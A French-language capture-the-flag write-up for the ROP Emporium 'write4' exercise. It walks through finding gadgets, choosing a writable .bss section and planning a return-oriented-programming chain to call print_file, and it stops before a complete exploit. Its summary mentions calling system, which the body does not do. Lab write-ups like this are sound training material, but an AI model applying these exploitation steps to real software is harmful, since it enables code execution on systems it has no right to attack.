# Ropemporium : write4



## TLDR 

- Ecrire 'cat flag.txt' en mémoire
- pousser l'adresse avec un gadget
- appeler system 


## checksec


```
$ checksec write4
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

NX => rop


## Read/Write 

On va poser une valeur, et une adresse dans 2 registrer avec des pop.
Cherchons un gadget qui permettre un mov d'une valeur vers une adresse avec un ret final
```
$ ROPgadget --binary write4 | grep mov | grep ret
0x00000000004005e2 : mov byte ptr [rip + 0x200a4f], 1 ; pop rbp ; ret
0x0000000000400629 : mov dword ptr [rsi], edi ; ret
0x0000000000400610 : mov eax, 0 ; pop rbp ; ret
0x0000000000400628 : mov qword ptr [r14], r15 ; ret
```
0x0000000000400628 : mov qword ptr [r14], r15 ; ret
Permet de placer la valeur r15 en r14 au format 64 bits


## pop

```
$ ROPgadget --binary write4 | grep "pop r14"
0x000000000040068c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040068e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400690 : pop r14 ; pop r15 ; ret
0x000000000040068b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040068f : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040068d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
```
Parfait !
0x0000000000400690 : pop r14 ; pop r15 ; ret


## Zone mémoire 

Cherchons une zone mémoire en -rw-
```
$ r2 write4 
 -- command not found: calc.exe
[0x00400520]> iS
[Sections]

nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000    0x0 0x00000000    0x0 ---- 
1   0x00000238   0x1c 0x00400238   0x1c -r-- .interp
2   0x00000254   0x20 0x00400254   0x20 -r-- .note.ABI-tag
3   0x00000274   0x24 0x00400274   0x24 -r-- .note.gnu.build-id
4   0x00000298   0x38 0x00400298   0x38 -r-- .gnu.hash
5   0x000002d0   0xf0 0x004002d0   0xf0 -r-- .dynsym
6   0x000003c0   0x7c 0x004003c0   0x7c -r-- .dynstr
7   0x0000043c   0x14 0x0040043c   0x14 -r-- .gnu.version
8   0x00000450   0x20 0x00400450   0x20 -r-- .gnu.version_r
9   0x00000470   0x30 0x00400470   0x30 -r-- .rela.dyn
10  0x000004a0   0x30 0x004004a0   0x30 -r-- .rela.plt
11  0x000004d0   0x17 0x004004d0   0x17 -r-x .init
12  0x000004f0   0x30 0x004004f0   0x30 -r-x .plt
13  0x00000520  0x182 0x00400520  0x182 -r-x .text
14  0x000006a4    0x9 0x004006a4    0x9 -r-x .fini
15  0x000006b0   0x10 0x004006b0   0x10 -r-- .rodata
16  0x000006c0   0x44 0x004006c0   0x44 -r-- .eh_frame_hdr
17  0x00000708  0x120 0x00400708  0x120 -r-- .eh_frame
18  0x00000df0    0x8 0x00600df0    0x8 -rw- .init_array
19  0x00000df8    0x8 0x00600df8    0x8 -rw- .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- .got
22  0x00001000   0x28 0x00601000   0x28 -rw- .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- .data
24  0x00001038    0x0 0x00601038    0x8 -rw- .bss
25  0x00001038   0x29 0x00000000   0x29 ---- .comment
26  0x00001068  0x618 0x00000000  0x618 ---- .symtab
27  0x00001680  0x1f6 0x00000000  0x1f6 ---- .strtab
28  0x00001876  0x103 0x00000000  0x103 ---- .shstrtab

[0x00400520]> 
```
For this time I’ll be writing to the .bss section, although .data section would work just as fine.

## Appel de fonction 


```
$ objdump -d write4 

Déassemblage de la section .plt :

0000000000400510 <print_file@plt>:
  400510:       ff 25 0a 0b 20 00       jmpq   *0x200b0a(%rip)        # 601020 <print_file>
  400516:       68 01 00 00 00          pushq  $0x1
  40051b:       e9 d0 ff ff ff          jmpq   4004f0 <.plt>
```

=> Call 0x400510 



```
$ objdump -d libwrite4.so 

0000000000000943 <print_file>:
 943:   55                      push   %rbp
 944:   48 89 e5                mov    %rsp,%rbp
 947:   48 83 ec 40             sub    $0x40,%rsp       -> Reserve de la place sur la stack
 94b:   48 89 7d c8             mov    %rdi,-0x38(%rbp) -> Valeur en rdi
 94f:   48 c7 45 f8 00 00 00    movq   $0x0,-0x8(%rbp)
 956:   00 
 957:   48 8b 45 c8             mov    -0x38(%rbp),%rax
 95b:   48 8d 35 d5 00 00 00    lea    0xd5(%rip),%rsi        # a37 <_fini+0x67>
 962:   48 89 c7                mov    %rax,%rdi
 965:   e8 36 fe ff ff          callq  7a0 <fopen@plt>
 96a:   48 89 45 f8             mov    %rax,-0x8(%rbp)
 96e:   48 83 7d f8 00          cmpq   $0x0,-0x8(%rbp)
 973:   75 22                   jne    997 <print_file+0x54>
 975:   48 8b 45 c8             mov    -0x38(%rbp),%rax
 979:   48 89 c6                mov    %rax,%rsi
 97c:   48 8d 3d b6 00 00 00    lea    0xb6(%rip),%rdi        # a39 <_fini+0x69>
 983:   b8 00 00 00 00          mov    $0x0,%eax
 988:   e8 c3 fd ff ff          callq  750 <printf@plt>
 98d:   bf 01 00 00 00          mov    $0x1,%edi
 992:   e8 19 fe ff ff          callq  7b0 <exit@plt>
 997:   48 8b 55 f8             mov    -0x8(%rbp),%rdx
 99b:   48 8d 45 d0             lea    -0x30(%rbp),%rax
 99f:   be 21 00 00 00          mov    $0x21,%esi
 9a4:   48 89 c7                mov    %rax,%rdi
 9a7:   e8 d4 fd ff ff          callq  780 <fgets@plt>
 9ac:   48 8d 45 d0             lea    -0x30(%rbp),%rax
 9b0:   48 89 c7                mov    %rax,%rdi
 9b3:   e8 78 fd ff ff          callq  730 <puts@plt>
 9b8:   48 8b 45 f8             mov    -0x8(%rbp),%rax
 9bc:   48 89 c7                mov    %rax,%rdi
 9bf:   e8 7c fd ff ff          callq  740 <fclose@plt>
 9c4:   48 c7 45 f8 00 00 00    movq   $0x0,-0x8(%rbp)
 9cb:   00 
 9cc:   90                      nop
 9cd:   c9                      leaveq 
 9ce:   c3                      retq   
```

Mettre l'adresse de notre string en rdi

## Gadget 


```
$ ROPgadget --binary write4 | grep "pop rdi"
0x0000000000400693 : pop rdi ; ret
```

